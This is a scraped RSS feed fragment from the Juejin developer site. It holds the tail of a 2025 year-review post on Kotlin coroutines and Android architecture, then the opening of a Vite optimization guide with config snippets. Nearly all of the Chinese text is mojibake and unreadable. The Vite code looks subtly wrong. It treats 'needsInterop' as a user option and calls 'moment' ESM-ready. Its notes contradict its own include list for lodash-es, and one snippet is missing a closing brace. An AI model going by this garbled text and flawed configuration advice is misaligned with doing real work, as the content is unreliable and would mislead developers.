<p>è¿™å››æ¡çº¢çº¿ï¼Œè®©æˆ‘åœ¨å›¢é˜Ÿé‡Œç¬¬ä¸€æ¬¡æŠŠâ€œåç¨‹æ¶æ„è§„èŒƒâ€è®²æ¸…æ¥šäº†ã€‚</p>
<h3 data-id="heading-13"><strong>3. Repository ä¸åº”è¯¥å¯åŠ¨åç¨‹</strong></h3>
<p>ä»Šå¹´æˆ‘é‡æ„äº†å¤§é‡ä»£ç ï¼ŒæŠŠè¿™ç§å†™æ³•ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/587b80a7aea344af859cace5ebc5ae6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767960346&amp;x-signature=gF%2FSq3Ys%2F8HhswJ308ShASQjnDU%3D" alt="image.png" loading="lazy"/></p>
<p>æ”¹æˆï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90f59827f82843fea87ab47bba21b140~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767960346&amp;x-signature=5ghQhaSAQt4i7tkOzUf2lZ%2FsCKw%3D" alt="image.png" loading="lazy"/></p>
<p>å½“ç„¶å¦‚æœrepoå±‚å‘èµ·äº†ç½‘ç»œè¯·æ±‚(retrofit)æˆ–è€…æ“ä½œæ•°æ®åº“(room),é‚£ä¹ˆwithContext(Dispatchers.IO) ä¹Ÿçœäº†ã€‚å¦‚ä¸‹:</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa71a508c14043deac3266b02bf388fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767960346&amp;x-signature=A0XUa2L1MS27pzp0%2FwtwZEo4BNc%3D" alt="image.png" loading="lazy"/></p>
<p>åç¨‹ä½œç”¨åŸŸäº¤ç»™ ViewModel ç®¡ç†ï¼Œç”Ÿå‘½å‘¨æœŸæ›´æ¸…æ™°ï¼Œæµ‹è¯•ä¹Ÿæ›´ç®€å•ã€‚</p>
<h2 data-id="heading-14">âš™ï¸ ä¸‰ã€å·¥ç¨‹èƒ½åŠ›ï¼šä»â€œèƒ½è§£å†³é—®é¢˜â€åˆ°â€œèƒ½æ­ä½“ç³»â€</h2>
<p>ä»Šå¹´æˆ‘åœ¨å·¥ç¨‹å®è·µä¸Šåšäº†å‡ ä»¶è®©æˆ‘è‡ªå·±å¾ˆæ»¡æ„çš„äº‹æƒ…ï¼š<br/>
ä¸åªæ˜¯æŠŠé—®é¢˜è§£å†³æ‰ï¼Œè€Œæ˜¯æŠŠå®ƒä»¬æ²‰æ·€æˆ<strong>å¯å¤ç”¨ã€å¯æ¨å¹¿çš„å·¥ç¨‹èƒ½åŠ›</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-15"><strong>1. éé˜»å¡ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼šä» Java é˜»å¡æ¨¡å‹åˆ°åç¨‹æ¨¡å‹</strong></h3>
<p>åœ¨å¹¶å‘ç¼–ç¨‹é‡Œï¼Œé˜Ÿåˆ—æ˜¯æœ€åŸºç¡€ä¹Ÿæœ€å…³é”®çš„æ•°æ®ç»“æ„ï¼Œå°¤å…¶æ˜¯åœ¨ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹ä¸­ã€‚<br/>
Java çš„é˜»å¡é˜Ÿåˆ—ï¼ˆå¦‚ <code>ArrayBlockingQueue</code>ã€<code>PriorityBlockingQueue</code>ï¼‰è™½ç„¶æˆç†Ÿï¼Œä½†å®ƒä»¬ä¾èµ–çº¿ç¨‹é˜»å¡ä¸å”¤é†’ï¼Œæ„å‘³ç€ï¼š</p>
<ul>
<li>çº¿ç¨‹ä¼šè¢«æŒ‚èµ·</li>
<li>éœ€è¦ OS è°ƒåº¦</li>
<li>ä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬é«˜</li>
</ul>
<p>åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œè¿™ç§æ¨¡å‹å¾€å¾€ä¼šæˆä¸ºç“¶é¢ˆã€‚</p>
<p>ä»Šå¹´æˆ‘å°è¯•æŠŠè¿™ä¸ªé—®é¢˜æ¢ä¸€ç§æ–¹å¼è§£å†³ï¼š<br/>
<strong>ç”¨ Kotlin åç¨‹å®ç°ä¸€ä¸ªçœŸæ­£æ„ä¹‰ä¸Šçš„â€œéé˜»å¡ä¼˜å…ˆçº§é˜Ÿåˆ—â€ã€‚</strong></p>
<p>åç¨‹çš„æŒ‚èµ·ä¸ä¼šé˜»å¡çº¿ç¨‹ï¼Œå› æ­¤å¯ä»¥è®©é˜Ÿåˆ—åœ¨â€œç©ºâ€æˆ–â€œæ»¡â€æ—¶æŒ‚èµ·åç¨‹ï¼Œè€Œä¸æ˜¯æŒ‚èµ·çº¿ç¨‹ã€‚<br/>
è¿™å¸¦æ¥çš„å¥½å¤„éå¸¸æ˜æ˜¾ï¼š</p>
<ul>
<li>æ²¡æœ‰çº¿ç¨‹é˜»å¡</li>
<li>æ²¡æœ‰çº¿ç¨‹å”¤é†’</li>
<li>æ²¡æœ‰ä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li>å¹¶å‘ååé‡æ›´é«˜</li>
</ul>
<p>æ˜¯æ ¸å¿ƒå®ç°è¯·çœ‹
<a href="https://juejin.cn/post/7531992014910930995" target="_blank" title="https://juejin.cn/post/7531992014910930995">åŸºäºKotlinåç¨‹çš„éé˜»å¡ä¼˜å…ˆçº§é˜Ÿåˆ—è®¾è®¡ä¸å®ç°</a></p>
<p>è¿™ç§èƒ½åŠ›åœ¨å®é™…åœºæ™¯ä¸­éå¸¸æœ‰ä»·å€¼ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ä»»åŠ¡è°ƒåº¦ç³»ç»Ÿ</li>
<li>å®æ—¶ç³»ç»Ÿ</li>
<li>å¤šä¼˜å…ˆçº§ä»»åŠ¡å¤„ç†</li>
<li>è½¦è½½ç³»ç»Ÿã€IoT ç­‰é«˜å¹¶å‘ä½†çº¿ç¨‹èµ„æºæœ‰é™çš„åœºæ™¯</li>
</ul>
<p>å®ƒè®©æˆ‘ç¬¬ä¸€æ¬¡çœŸæ­£æ„Ÿå—åˆ°ï¼š<br/>
<strong>åç¨‹ä¸æ˜¯â€œè½»é‡çº¿ç¨‹â€ï¼Œè€Œæ˜¯å¦ä¸€ç§å¹¶å‘æ¨¡å‹ã€‚</strong></p>
<h3 data-id="heading-16"><strong>2. æ·±å…¥ç†è§£ runBlockingï¼šåç¨‹ä¸–ç•Œä¸é˜»å¡ä¸–ç•Œçš„â€œå”¯ä¸€æ¡¥æ¢â€</strong></h3>
<p><code>runBlocking</code> æ˜¯åç¨‹é‡Œæœ€å®¹æ˜“è¢«è¯¯ç”¨çš„ APIã€‚<br/>
å®ƒçš„ä½œç”¨å¾ˆç›´æ¥ï¼š<strong>å¯åŠ¨ä¸€ä¸ªåç¨‹ï¼Œå¹¶é˜»å¡å½“å‰çº¿ç¨‹ç›´åˆ°åç¨‹æ‰§è¡Œå®Œæ¯•ã€‚</strong></p>
<p>å®ƒçš„å­˜åœ¨æ„ä¹‰éå¸¸æ˜ç¡®ï¼š<br/>
<strong>åœ¨é˜»å¡ä¸–ç•Œä¸åç¨‹ä¸–ç•Œä¹‹é—´æ­æ¡¥ã€‚</strong></p>
<p>å®ƒçš„æœ¬è´¨æ˜¯ï¼š</p>
<blockquote>
<p><strong>æŠŠæŒ‚èµ·å‡½æ•°å˜æˆé˜»å¡è°ƒç”¨ï¼Œè®©éåç¨‹ç¯å¢ƒä¹Ÿèƒ½ä½¿ç”¨åç¨‹èƒ½åŠ›ã€‚</strong></p>
</blockquote>
<p>å…¸å‹åœºæ™¯åŒ…æ‹¬ï¼š</p>
<ul>
<li>Java ä»£ç è°ƒç”¨ Kotlin æŒ‚èµ·å‡½æ•°</li>
<li>Retrofit æ‹¦æˆªå™¨éœ€è¦åŒæ­¥è·å– token</li>
<li>åŸºäº HandlerThread çš„æ—§æ¶æ„éœ€è¦ä¸²è¡Œæ‰§è¡ŒæŒ‚èµ·ä»»åŠ¡</li>
</ul>
<p><a href="https://juejin.cn/post/7566524333696794665" target="_blank" title="https://juejin.cn/post/7566524333696794665">Android ä¸­  runBlockingå…¶å®åªæœ‰ä¸€ç§ä½¿ç”¨åœºæ™¯</a></p>
<p>ä½†å³ä¾¿å¦‚æ­¤ï¼Œä¹Ÿåº”è¯¥ä¼˜å…ˆè€ƒè™‘çº¯åç¨‹æ–¹æ¡ˆï¼ŒrunBlocking åªæ˜¯å…œåº•æ‰‹æ®µã€‚</p>
<h3 data-id="heading-17">4. Kotlin åç¨‹çš„äº”å¤§å¸¸è§é”™è¯¯ç”¨æ³•åŠæœ€ä½³å®è·µ</h3>
<p>è¯¦æƒ…è¯·è§ <a href="https://juejin.cn/post/7527881245238263846" target="_blank" title="https://juejin.cn/post/7527881245238263846">Kotlin åç¨‹çš„äº”å¤§å¸¸è§é”™è¯¯ç”¨æ³•åŠæœ€ä½³å®è·µ</a></p>
<h2 data-id="heading-18">ğŸ§© å››ã€æ–‡æ¡£ï¼šä»â€œå†™æ–‡æ¡£â€åˆ°â€œåšçŸ¥è¯†äº§å“â€</h2>
<p>ä»Šå¹´æˆ‘å†™çš„æ–‡æ¡£æ¯”å†™ä»£ç è¿˜å¤šã€‚</p>
<p>åŸå› å¾ˆç®€å•ï¼š
æˆ‘æœ‰å¼ºçƒˆçš„åˆ†äº«æ¬²ï¼Œä¹Ÿä¹ æƒ¯æŠŠä¸€åˆ‡åšæˆå¯å¤ç”¨çš„è§„èŒƒã€‚æ¯”å¦‚:</p>
<h3 data-id="heading-19"><a href="https://juejin.cn/user/2313028195058471/posts" target="_blank" title="https://juejin.cn/user/2313028195058471/posts">Kotlin åç¨‹çš„äº”å¤§å¸¸è§é”™è¯¯ç”¨æ³•åŠæœ€ä½³å®è·µ</a></h3>
<h3 data-id="heading-20"><a href="https://juejin.cn/post/7583567658253762586" target="_blank" title="https://juejin.cn/post/7583567658253762586">Repository æ–¹æ³•è®¾è®¡ï¼šsuspend ä¸ Flow çš„å†³é€‰æ‹©æŒ‡å—ï¼ˆä»¥æœ‹å‹åœˆä¸ºä¾‹ï¼‰</a></h3>
<h3 data-id="heading-21"><a href="https://juejin.cn/post/7585476892975988770" target="_blank" title="https://juejin.cn/post/7585476892975988770">Android Data å±‚è®¾è®¡çš„å››æ¡çº¢çº¿ï¼šä¸ºä»€ä¹ˆå¿…é¡»åšæŒã€å¦‚ä½•è½åœ°</a></h3>
<p>æ‰€ä»¥æˆ‘å¼€å§‹ç”¨æ›´â€œäº§å“åŒ–â€çš„æ–¹å¼æ²‰æ·€çŸ¥è¯†ï¼š</p>
<p>ç”¨å›¾æŠŠæ¶æ„è®²å¾—ä¸€ç›®äº†ç„¶</p>
<p>ç”¨ç±»æ¯”æŠŠå¤æ‚é€»è¾‘è®²å¾—äººäººèƒ½æ‡‚</p>
<p>ç”¨æ¨¡æ¿æŠŠæ–°äºº onboarding çš„æˆæœ¬é™åˆ°æœ€ä½</p>
<p>å‰é˜µå­æˆ‘ç»™å›¢é˜Ÿåšäº†ä¸€ä»½â€œé”™è¯¯å¤„ç†æµç¨‹å›¾â€ï¼Œ
å¤§å®¶çœ‹å®Œåçš„ç¬¬ä¸€å¥è¯æ˜¯ï¼šâ€œç»ˆäºæ‡‚äº†ã€‚â€</p>
<p>é‚£ä¸€åˆ»æˆ‘æ›´ç¡®å®šï¼š
æ–‡æ¡£ä¸æ˜¯è®°å½•ï¼Œè€Œæ˜¯å›¢é˜Ÿçš„çŸ¥è¯†åŸºç¡€è®¾æ–½ã€‚</p>
<h2 data-id="heading-22">ğŸ¤ äº”ã€AIï¼šä»å·¥å…·åˆ°â€œç¬¬äºŒå¤§è„‘â€</h2>
<p>2025ï¼Œæˆ‘çœŸæ­£å­¦ä¼šäº†å’Œ AI åˆä½œã€‚</p>
<p>æˆ‘ç”¨å®ƒï¼š</p>
<h5 data-id="heading-23">ç”Ÿæˆæ¶æ„å›¾</h5>
<h5 data-id="heading-24">å†™æ–‡æ¡£</h5>
<h5 data-id="heading-25">éªŒè¯è®¾è®¡</h5>
<h5 data-id="heading-26">åšçŸ¥è¯†æ ‘</h5>
<h5 data-id="heading-27">å½“æ€è€ƒä¼™ä¼´</h5>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘ä¸å†æŠŠ AI å½“æˆå·¥å…·ï¼Œè€Œæ˜¯æŠŠå®ƒå½“æˆéšæ—¶åœ¨çº¿çš„ç¬¬äºŒå¤§è„‘ã€‚</p>
<h2 data-id="heading-28">ğŸš€ å…­ã€2026ï¼šä»â€œç§¯ç´¯â€åˆ°â€œå½±å“åŠ›â€</h2>
<p>æ˜å¹´æˆ‘æƒ³åšä¸‰ä»¶äº‹ï¼š</p>
<h4 data-id="heading-29"><strong>1. æŠŠæŠ€æœ¯ä½“ç³»è¡¥å…¨</strong></h4>
<p>åŒ…æ‹¬ï¼š</p>
<ul>
<li>clean æ¶æ„</li>
<li>Compose æœ€ä½³å®è·µ</li>
<li>å·¥ç¨‹åŒ–ä¸å¹¶å‘æ¨¡å‹</li>
</ul>
<h4 data-id="heading-30"><strong>2. è¾“å‡ºæ›´å¤šâ€œåˆ«äººèƒ½ç›´æ¥ç”¨â€çš„ä¸œè¥¿</strong></h4>
<p>æ¯”å¦‚ï¼š</p>
<ul>
<li>æ¨¡æ¿</li>
<li>å›¾ç¤º</li>
<li>ä»£ç éª¨æ¶</li>
<li>ä½“ç³»åŒ–çŸ¥è¯†</li>
</ul>
<h4 data-id="heading-31"><strong>3. è®© AI æˆä¸ºçœŸæ­£çš„åˆä½œè€…</strong></h4>
<p>ç»§ç»­æ¢ç´¢ï¼š</p>
<ul>
<li>AI å¦‚ä½•å‚ä¸æ¶æ„è®¾è®¡</li>
<li>AI å¦‚ä½•ç”Ÿæˆæ–‡æ¡£</li>
<li>AI å¦‚ä½•èå…¥å­¦ä¹ ç³»ç»Ÿ</li>
</ul>
<h2 data-id="heading-32"><strong>ç»“è¯­ï¼š2025ï¼Œæ˜¯æˆ‘æŠ€æœ¯ç”Ÿæ¶¯çš„â€œç»“æ„åŒ–å…ƒå¹´â€</strong></h2>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘ä¸å†ç›²ç›®è¿½æ±‚æŠ€æœ¯æ ˆçš„â€œå¢é‡â€ï¼Œè€Œå¼€å§‹æ·±è€•çŸ¥è¯†çš„â€œè´¨é‡â€ã€‚æˆ‘æ—¶åˆ»å¤ç›˜è¿™äº”ä¸ªç»´åº¦ï¼š</p>
<h5 data-id="heading-33">å¯å¤ç”¨æ€§ï¼šä»£ç èƒ½å¦è¶…è¶Šå•ä¸€åœºæ™¯ï¼Œè½¬åŒ–ä¸ºé€šç”¨çš„èµ„äº§</h5>
<h5 data-id="heading-34">å¯é˜è¿°æ€§ï¼šé€»è¾‘èƒ½å¦æŠ½ä¸å‰¥èŒ§ï¼Œè®©å¤æ‚çš„æ¶æ„å˜å¾—ç›´è§‚æ˜“æ‡‚</h5>
<h5 data-id="heading-35">å¯ä¼ é€’æ€§ï¼šæ€æƒ³èƒ½å¦è·¨è¶Šä¸ªä½“ï¼Œæˆä¸ºå›¢é˜Ÿåä½œçš„å…±è¯†</h5>
<h5 data-id="heading-36">å¯æ²‰æ·€æ€§ï¼šç»éªŒèƒ½å¦è„±ç¦»ä¸šåŠ¡ï¼Œå›ºåŒ–ä¸ºå¯å‚è€ƒçš„å®è·µæŒ‡å—</h5>
<h5 data-id="heading-37">ä½“ç³»åŒ–ï¼šé›¶æ•£çš„ç‚¹èƒ½å¦è¿æ¥æˆé¢ï¼Œæ„å»ºå‡ºç¨³å›ºçš„æŠ€æœ¯æŠ¤åŸæ²³</h5></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite 5å¤§å®æˆ˜ä¼˜åŒ–æŠ€å·§ï¼šè®©ä½ çš„å¼€å‘æ•ˆç‡æå‡200%ï½œ2025å‰ç«¯å·¥ç¨‹åŒ–æŒ‡å—]]></title>    <link>https://juejin.cn/post/7590159073989427252</link>    <guid>https://juejin.cn/post/7590159073989427252</guid>    <pubDate>2026-01-03T00:17:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590159073989427252" data-draft-id="7590303618428420131" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite 5å¤§å®æˆ˜ä¼˜åŒ–æŠ€å·§ï¼šè®©ä½ çš„å¼€å‘æ•ˆç‡æå‡200%ï½œ2025å‰ç«¯å·¥ç¨‹åŒ–æŒ‡å—"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-03T00:17:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite 5å¤§å®æˆ˜ä¼˜åŒ–æŠ€å·§ï¼šè®©ä½ çš„å¼€å‘æ•ˆç‡æå‡200%ï½œ2025å‰ç«¯å·¥ç¨‹åŒ–æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-03T00:17:45.000Z" title="Sat Jan 03 2026 00:17:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vite 5å¤§å®æˆ˜ä¼˜åŒ–æŠ€å·§ï¼šè®©ä½ çš„å¼€å‘æ•ˆç‡æå‡200%ï½œ2025å‰ç«¯å·¥ç¨‹åŒ–æŒ‡å—</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>åœ¨å‰ç«¯å·¥ç¨‹åŒ–é¢†åŸŸï¼Œæ„å»ºå·¥å…·çš„æ€§èƒ½å’Œå¼€å‘ä½“éªŒç›´æ¥å½±å“å›¢é˜Ÿçš„ç”Ÿäº§åŠ›ã€‚Vite ä½œä¸ºæ–°ä¸€ä»£å‰ç«¯æ„å»ºå·¥å…·ï¼Œå‡­å€Ÿå…¶åŸç”Ÿ ESMï¼ˆES Modulesï¼‰æ”¯æŒå’Œæé€Ÿçš„çƒ­æ›´æ–°èƒ½åŠ›ï¼Œå·²ç»æˆä¸ºç°ä»£å‰ç«¯å¼€å‘çš„æ ‡æ†ã€‚ç„¶è€Œï¼Œè®¸å¤šå¼€å‘è€…ä»…åœç•™åœ¨åŸºç¡€ä½¿ç”¨å±‚é¢ï¼Œæœªèƒ½å……åˆ†å‘æŒ¥ Vite çš„æ½œåŠ›ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥å‰–æ Vite çš„ <strong>5 å¤§å®æˆ˜ä¼˜åŒ–æŠ€å·§</strong>ï¼Œæ¶µç›–é…ç½®è°ƒä¼˜ã€ä¾èµ–é¢„æ„å»ºã€æ’ä»¶æ‰©å±•ã€SSR ä¼˜åŒ–ä»¥åŠç”Ÿäº§æ„å»ºæé€Ÿç­‰æ–¹é¢ã€‚é€šè¿‡ç§‘å­¦åˆç†çš„ä¼˜åŒ–æ‰‹æ®µï¼Œä½ çš„å¼€å‘æ•ˆç‡æœ‰æœ›æå‡ <strong>200%</strong> ä»¥ä¸Šã€‚æ— è®ºä½ æ˜¯ä¸ªäººå¼€å‘è€…è¿˜æ˜¯å›¢é˜ŸæŠ€æœ¯è´Ÿè´£äººï¼Œè¿™äº›æŠ€å·§éƒ½å°†ä¸ºä½ çš„é¡¹ç›®å¸¦æ¥è´¨çš„é£è·ƒã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸€ã€ç²¾å‡†é…ç½®ï¼šä»é»˜è®¤åˆ°æè‡´</h2>
<h3 data-id="heading-3">1.1 æŒ‰éœ€å¯ç”¨ <code>optimizeDeps</code></h3>
<p>Vite çš„ä¾èµ–é¢„æ„å»ºï¼ˆDependency Pre-Bundlingï¼‰æ˜¯å…¶æ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€ï¼Œä½†é»˜è®¤é…ç½®å¯èƒ½æ— æ³•æ»¡è¶³æ‰€æœ‰åœºæ™¯éœ€æ±‚ã€‚é€šè¿‡ç²¾ç»†åŒ–é…ç½® <code>optimizeDeps</code>ï¼Œå¯ä»¥æ˜¾è‘—å‡å°‘å†·å¯åŠ¨æ—¶é—´ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">optimizeDeps</span>: {
    <span class="hljs-attr">include</span>: [<span class="hljs-string">'lodash-es'</span>, <span class="hljs-string">'axios'</span>], <span class="hljs-comment">// å¼ºåˆ¶é¢„æ„å»ºç‰¹å®šä¾èµ–</span>
    <span class="hljs-attr">exclude</span>: [<span class="hljs-string">'moment'</span>],            <span class="hljs-comment">// æ’é™¤å·²é€‚é… ESM çš„åº“</span>
    <span class="hljs-attr">needsInterop</span>: [<span class="hljs-string">'react-dom'</span>]     <span class="hljs-comment">// æ ‡è®°éœ€è¦ ESM è½¬æ¢çš„ CJS æ¨¡å—</span>
  }
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li><code>include</code>ï¼šé¿å…åŠ¨æ€å¯¼å…¥å¯¼è‡´çš„é‡å¤æ„å»ºã€‚</li>
<li><code>exclude</code>ï¼šè·³è¿‡å·²æ”¯æŒ ESM çš„åº“ï¼ˆå¦‚ <code>lodash-es</code>ï¼‰ã€‚</li>
<li><code>needsInterop</code>ï¼šè§£å†³ CommonJS â†’ ESM çš„å…¼å®¹æ€§é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-4">1.2 Chunking Strategyï¼šæ‰‹åŠ¨æ§åˆ¶ä»£ç åˆ†å‰²</h3>
<p>é»˜è®¤çš„æ–‡ä»¶åˆ†å‰²ç­–ç•¥å¯èƒ½å¯¼è‡´å†—ä½™è¯·æ±‚ã€‚é€šè¿‡ <code>rollupOptions.output.manualChunks</code> è‡ªå®šä¹‰åˆ†å‰²é€»è¾‘ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">build</span>: {
    <span class="hljs-attr">rollupOptions</span>: {
      <span class="hljs-attr">output</span>: {
        <span class="hljs-attr">manualChunks</span>: {
          <span class="hljs-attr">vendor</span>: [<span class="hljs-string">'react'</span>, <span class="hljs-string">'react-dom'</span>],
          <span class="hljs-attr">utils</span>: [<span class="hljs-string">'lodash-es'</span>, <span class="hljs-string">'date-fns'</span>]
        }
      }
    }
}
</code></pre>
